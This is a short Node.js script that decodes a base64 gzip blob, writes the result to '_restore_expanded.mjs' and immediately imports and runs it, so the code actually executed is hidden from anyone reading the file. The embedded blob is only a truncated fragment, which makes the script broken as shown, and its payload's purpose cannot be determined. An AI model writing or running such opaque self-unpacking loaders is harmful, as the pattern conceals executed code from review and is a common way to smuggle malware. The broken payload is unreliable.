#!/usr/bin/env node
import fs from 'fs';
import path from 'path';
import zlib from 'zlib';
import { fileURLToPath, pathToFileURL } from 'url';
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const b64 = [
  "H4sIAAAAAAAAA+09a3PbxpLf9StQXCmOKVKi9JJsJz5WsiXZkR1ZlmwnueQyhQFxIAkBFwCwFEX+"
].join('');
const out = path.join(__dirname, '_restore_expanded.mjs');
fs.writeFileSync(out, zlib.gunzipSync(Buffer.from(b64, 'base64')));
await import(pathToFileURL(out).href);
